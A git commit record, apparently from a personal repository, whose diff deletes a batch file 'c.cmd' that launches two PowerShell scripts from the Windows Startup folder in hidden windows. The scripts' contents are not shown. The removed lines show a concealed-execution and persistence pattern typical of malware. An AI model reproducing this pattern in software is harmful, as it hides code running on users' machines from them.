27971407151086b0fcc705373abf3591b27c37cf
gabrielg13rojas <gabrielg13rojas@gmail.com>
2023-05-05 09:58:26 -0400

    Delete c.cmd

--- c.cmd
+++
@@ -1,3 +0,0 @@
-@echo off
-powershell Start-Process powershell.exe -windowstyle hidden "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start%Menu/Programs/Startup/p.ps1"
-powershell Start-Process powershell.exe -windowstyle hidden "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start%Menu/Programs/Startup/l.ps1"
